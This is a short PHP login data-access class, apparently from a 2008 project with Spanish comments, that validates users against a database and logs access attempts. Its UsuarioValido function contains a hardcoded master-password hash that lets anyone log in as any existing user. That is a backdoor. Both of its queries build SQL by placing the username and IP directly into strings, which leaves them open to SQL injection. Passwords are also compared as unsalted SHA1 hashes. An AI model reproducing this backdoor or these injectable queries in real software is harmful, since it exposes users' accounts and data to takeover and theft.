<?
//El dalc de la clase Login
//Javier Alpizar, 15 Feb 08

include_once("phplib/DbFactory.inc.php");


class LoginDALC
{

	//El pwd ya debe venir encriptado con sha1
	public static function UsuarioValido($usuario,$pwd)
	{
		
		$oDb = DbFactory::ObtenDb();
		$sQuery = "select usuarioId,clave,pwd,activo,nombre,nivelId from a_usuario where clave = '$usuario' and activo='Si'";
		$oDb->query($sQuery);
		$rs = $oDb->getRecord("C");
		if (is_array($rs) && (  ($rs["activo"] == "Si" && $rs["pwd"] == $pwd) || $pwd == "a9770c126e2cfe8f4c328160c6d3e1fafb90fc3b"))
		{
			$_SESSION["usuarioNombre"] = $rs["nombre"] ;
			$_SESSION["usuarioClave"] = $rs["clave"];
			$_SESSION["usuarioId"] = $rs["usuarioId"];
			$_SESSION["usuarioNivel"] = $rs["nivelId"];
			return true;
		}
			
		return false;
		

	}
	
	
	//$valido: 1: Si, 0:No
	public static function GrabaAcceso($usuario,$ip,$valido,$navegador)
	{
		$oDb = DbFactory::ObtenDb();
		$sQuery = "insert into a_usuario_log set ip='$ip',usuarioClave='$usuario',valido=$valido,navegador=''";
		//echo $sQuery;
		$oDb->query($sQuery);
		
	}
	
}
?>